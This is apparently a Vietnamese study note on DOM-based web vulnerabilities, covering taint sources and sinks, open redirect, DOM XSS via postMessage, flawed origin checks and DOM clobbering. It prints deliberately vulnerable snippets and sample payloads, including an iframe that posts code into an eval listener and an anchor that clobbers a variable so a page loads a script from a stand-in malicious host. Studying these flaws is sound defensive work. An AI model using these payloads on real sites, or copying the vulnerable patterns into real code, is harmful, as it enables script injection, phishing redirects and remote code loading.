# DOM-based vulnerabilities
The Document Object Model (DOM) là dạng biểu diễn phân cấp của trình duyệt về các phần tử trên trang. Website có thể dùng JavaScript để thao tác các node và object trong DOM cũng như các thuộc tính của chúng. Bản thân việc thao tác DOM không phải là vấn đề; thực tế, đây là phần không thể thiếu của cách các website hiện đại hoạt động. Tuy nhiên, nếu JavaScript xử lý dữ liệu không an toàn, nó có thể mở ra nhiều kiểu tấn công. Lỗ hổng dựa trên DOM xuất hiện khi website có JavaScript lấy một giá trị có thể bị kẻ tấn công kiểm soát (gọi là source) và truyền nó vào một hàm nguy hiểm (gọi là sink).

## Taint-flow vulnerabilities
- Nhiều lỗ hổng DOM-based xuất phát từ việc code phía client xử lý dữ liệu do attacker kiểm soát (tainted data) không an toàn.
- Taint flow: là luồng dữ liệu chảy từ source (điểm vào) đến sink (điểm nguy hiểm). Nếu đi qua không kiểm soát → sinh ra lỗ hổng.

### Sources
Sources là các thuộc tính/biến trong JavaScript mà attacker có thể tác động:
```
location.search → đọc query string từ URL.
document.referrer → URL giới thiệu.
document.cookie → cookies
Web messages (postMessage).
```
Nói chung bất cứ dữ liệu nào attacker chỉnh được đều là source.

### Sinks
Là hàm/thuộc tính nếu nhận dữ liệu attacker đưa vào sẽ gây hậu quả:
```
eval() → chạy chuỗi như code JS.
document.body.innerHTML → chèn HTML độc hại (XSS).
```
Nói chung là nơi xử lý dữ liệu mà không kiểm tra.

### Khi nào lỗ hổng xảy ra?
- Khi dữ liệu từ `source` → đưa thẳng vào `sink` mà 
- không được lọc/validate.
Đây là **DOM-based vulnerability** trong session của client.

**Ví dụ: Open Redirect**
```js
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
- `location.hash` là `source` (attacker chỉnh được qua #... trong URL).
- `location` là `sink` (nếu gán URL mới → trình duyệt tự chuyển hướng).

Attacker có thể gửi link:
```
https://www.innocent-website.com/example#https://www.evil-user.net
```
Khi nạn nhân click → bị `redirect` sang site độc hại → dùng để `phishing`.

### Common sources
Sau đây là các nguồn điển hình có thể được sử dụng để khai thác nhiều lỗ hổng taint-flow:
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

Các loại dữ liệu sau đây cũng có thể được sử dụng làm source để khai thác lỗ hổng luồng dữ liệu độc hại:
#### Reflected DOM XSS: 
- Server nhận request, đưa dữ liệu vào response ngay lập tức (không lưu), và trang chứa script xử lý dữ liệu đó trên client rồi ghi vào sink.
- Ví dụ minh họa: server trả `eval('var data = "reflected string"');` và sau đó script dùng data một cách không an toàn → XSS.
#### Stored DOM XSS: 
- Server lưu lại dữ liệu từ một request (ví dụ comment), rồi khi người dùng khác mở trang, server trả nội dung đã lưu đó trong response. Nếu page chứa script xử lý dữ liệu lưu trữ này mà không kiểm tra → sẽ gây DOM XSS.
- Ví dụ minh họa: `element.innerHTML = comment.author` - nếu `comment.author` chứa payload thì payload sẽ được chèn và thực thi.
#### Web messages:
- `postMessage()` cho phép iframe/parent gửi dữ liệu giữa các tài liệu; nếu trang nhận (receiver) xử lý message đó không an toàn, dữ liệu từ message trở thành source để tấn công DOM.

- Nếu message được chấp nhận mà không kiểm tra origin hoặc kiểm tra sai cách, handler có thể đưa dữ liệu đó vào một sink (ví dụ eval, innerHTML, location, v.v.) → dẫn tới DOM-XSS hoặc hành vi độc hại khác.

- Cách tấn công: 
    - Xét đoạn mã sau:
    ```html
    <script>
        window.addEventListener('message', function(e) {
        eval(e.data);   // <- sink nguy hiểm, không kiểm tra origin -> vulnerable
        });
    </script>
    ```
    - Đoạn này dễ bị tổn thương vì kẻ tấn công có thể chèn payload JavaScript bằng cách tạo iframe như sau:
    ```html
    <iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
    ```
    - Bởi vì event listener không xác minh `origin` của message, và `postMessage()` được gọi với `targetOrigin` là `"*"`, nên event listener chấp nhận payload và truyền nó vào sink — trong trường hợp này là hàm `eval()`.

---

**Origin verification**

Ngay cả khi listener có kiểm tra origin, bước kiểm tra đó có thể sai căn bản. Ví dụ:
```js
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```
Phương thức `indexOf` được dùng để cố gắng kiểm tra xem origin của web message đến có phải là domain `normal-website.com` hay không. Tuy nhiên, trong thực tế, nó chỉ kiểm tra xem chuỗi "normal-website.com" có xuất hiện ở bất kỳ vị trí nào trong URL origin hay không. Do vậy, kẻ tấn công có thể dễ dàng vượt qua bước kiểm tra này nếu origin của message độc hại là `http://www.normal-website.com.evil.net`

Lỗi tương tự cũng xảy ra với các kiểm tra dựa trên `startsWith()` hoặc `endsWith()`. Ví dụ, event listener sau đây sẽ cho origin `http://www.malicious-websitenormal-website.com` là an toàn:
```js
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```
---

**Những sink nào có thể dẫn đến lỗ hổng dựa trên DOM?**

| DOM-based vulnerability                      | Example sink |
|---------------------------------------------|--------------|
| DOM XSS                                      | `document.write()` |
| Open redirection                              | `window.location` |
| Cookie manipulation                           | `document.cookie` |
| JavaScript injection                          | `eval()` |
| Document-domain manipulation                  | `document.domain` |
| WebSocket-URL poisoning                       | `WebSocket()` |
| Link manipulation                              | `element.src` |
| Web message manipulation                       | `postMessage()` |
| Ajax request-header manipulation               | `setRequestHeader()` |
| Local file-path manipulation                   | `FileReader.readAsText()` |
| Client-side SQL injection                      | `ExecuteSql()` |
| HTML5-storage manipulation                     | `sessionStorage.setItem()` |
| Client-side XPath injection                    | `document.evaluate()` |
| Client-side JSON injection                     | `JSON.parse()` |
| DOM-data manipulation                          | `element.setAttribute()` |
| Denial of service                              | `RegExp()` |

## DOM clobbering

DOM clobbering là một kỹ thuật trong đó bạn chèn HTML vào một trang để thao túng DOM và cuối cùng thay đổi hành vi của JavaScript trên trang. DOM clobbering đặc biệt hữu ích trong những trường hợp không thể thực hiện XSS, nhưng bạn có thể kiểm soát một số HTML trên trang nơi thuộc tính id hoặc name được phép bởi bộ lọc HTML. Hình thức phổ biến nhất của DOM clobbering dùng phần tử anchor để ghi đè một biến global, biến này sau đó được ứng dụng sử dụng theo cách không an toàn, chẳng hạn để tạo URL script động.

**Ví dụ:**
```js
var someObject = window.someObject || {};
```
Nếu bạn có thể kiểm soát một phần HTML trên trang, bạn có thể clobber (ghi đè) tham chiếu `someObject` bằng một node DOM, chẳng hạn một anchor. Xem xét mã sau:
```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

Để khai thác đoạn mã dễ bị tổn thương này, bạn có thể chèn HTML sau để clobber tham chiếu someObject bằng một phần tử anchor:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
Khi hai anchor sử dụng cùng một ID, DOM gom chúng lại thành một DOM collection. Vector DOM clobbering sau đó ghi đè tham chiếu `someObject` bằng collection DOM này. Thuộc tính `name` được dùng trên anchor cuối cùng nhằm clobber thuộc tính `url` của object `someObject`, khiến `script.src` trỏ tới một script ngoài (external) độc hại.